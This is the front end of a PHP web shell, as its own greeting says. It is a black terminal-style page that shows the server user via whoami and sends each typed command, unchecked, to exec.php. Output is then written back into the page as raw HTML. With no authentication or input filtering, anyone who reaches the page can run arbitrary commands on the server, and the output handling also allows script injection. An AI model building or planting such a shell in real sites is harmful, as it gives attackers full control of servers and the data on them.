<!--htmls-->
<div id="commands-div">
	
<div id="history-commands">
<p>
	hello to webshell
</p>	
</div>


<p>
	<span style="width: 20%"><?php echo doExec('whoami');?>&gt;</span>
	<input type="text" name="command-input" id="command-input" style="width:80%"/>
</p>
</div>

<!--js-->
<script>
$(function() {
	console.log("xxxx");
	var user = "<?php echo doExec('whoami');?>";
	$(document).keypress(function(e) {  
		if(e.which == 13) {
			var command = $("#command-input").val();
			console.log(command);
			$.get("exec.php?command=" + command, function(result){
				var $p = $("<p>").appendTo($("#history-commands"));
				$p.html('<span style="width: 20%">' + user + '&gt;<span>' + command);
				if (typeof result !== 'undefined') {
					$("<p>").html(result).appendTo($("#history-commands"));
				}
			});
			$("#command-input").val('');
		}  
	}); 
	
});
</script>

<!--css-->
<style>
#commands-div {
	width: 100%;
	background: black;
	color: white;
}

#command-input{
	border: none;
	
}
</style>




